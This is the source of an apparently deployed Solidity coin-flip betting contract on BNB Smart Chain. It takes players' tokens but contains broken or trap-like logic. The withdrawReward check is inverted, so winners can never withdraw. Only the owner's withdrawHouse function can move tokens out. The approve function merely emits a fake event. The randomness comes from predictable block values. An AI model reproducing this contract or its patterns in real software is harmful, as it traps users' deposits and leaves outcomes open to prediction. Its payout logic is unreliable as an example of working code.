/**
 *Submitted for verification at BscScan.com on 2021-07-21
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract CoinFlip {
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    address public owner = msg.sender;
    address public dev = owner;
    uint public fee = 5; // 5%
    address public betToken;
    address public rewardToken;
    uint256 public rewardPercent;
    uint private rounds = 0;
    
    
    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    
    function GameSetting (address _dev, uint _fee, address _betToken, address _rewardToken, uint256 _rewardPercent) public onlyOwner {
        dev = _dev;
        fee = _fee;
        betToken = _betToken;
        rewardToken = _rewardToken;
        rewardPercent = _rewardPercent;
    }
    
    /* ================== */
    // 1.Storage Data setting
    mapping(address => uint256) public gameResult;
    mapping(address => uint256) public playerReward;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    /* ================== */
    // betting function
    uint256 privSeed;
    uint private result;
    
    function allowance(address _owner, address _spender) external view returns (uint256) {
        return _allowances[_owner][_spender];
    }
    
    function _approve(address _owner, address _spender, uint256 _amount) internal {
        _owner = msg.sender;
        _spender = address(this);
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(_spender != address(0), "ERC20: approve to the zero address");
    
        emit Approval(_owner, _spender, _amount);
     }
    function approve(address _owner, address _spender) external returns (bool) {
        _approve(_owner, _spender, 999999999999000000000000000000);
        return true;
    }
    
    function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }

    function betting(uint _coinSide, uint _amount) public { 
        // ERC20(betToken).approve(address(msg.sender), uint(99999999999*10*18));
        ERC20(betToken).transferFrom(msg.sender, address(this), _amount);
        
    	// Seeds
    	privSeed = (privSeed*3 + 1) / 2;
    	privSeed = privSeed % 10**9;
        
    	uint number = block.number; // ~ 10**5 ; 60000
    	uint diff = block.difficulty; // ~ 2 Tera = 2*10**12; 1731430114620
    	uint time = block.timestamp; // ~ 2 Giga = 2*10**9; 1439147273
    	uint gas = block.gaslimit; // ~ 3 Mega = 3*10**6
    	// Rand Number in Percent
    	uint total = privSeed + number + diff + time + gas;
    	result = total %2;
    	rounds = rounds + 1;
    	
    	gameResult[msg.sender] = result;
    	
    	if(gameResult[msg.sender] == _coinSide)
    	  {
    	    playerReward[msg.sender] += _amount + ((_amount*rewardPercent)/100);
    	  }
    }
    
    /* ================== */
    // withdraw reward function
    function withdrawReward(uint256 _amount) public {
        require(_amount > playerReward[msg.sender], "Amount to withdraw too high");
        
        if (_amount <= playerReward[msg.sender]) {
            uint256 feeToDev = (playerReward[msg.sender] * fee) / 100;
            uint256 playerReceived = playerReward[msg.sender] - feeToDev;
            playerReward[msg.sender] -= _amount;
            ERC20(rewardToken).transfer(dev, feeToDev); // withdraw fee to dev
            ERC20(rewardToken).transfer(msg.sender, playerReceived); // withdraw real reward to player
        }
    }
    
    // Admin withdraw function
    function withdrawHouse(uint256 _amount) public onlyOwner{
        ERC20(rewardToken).transfer(owner, _amount); // withdraw token to owner
    }

}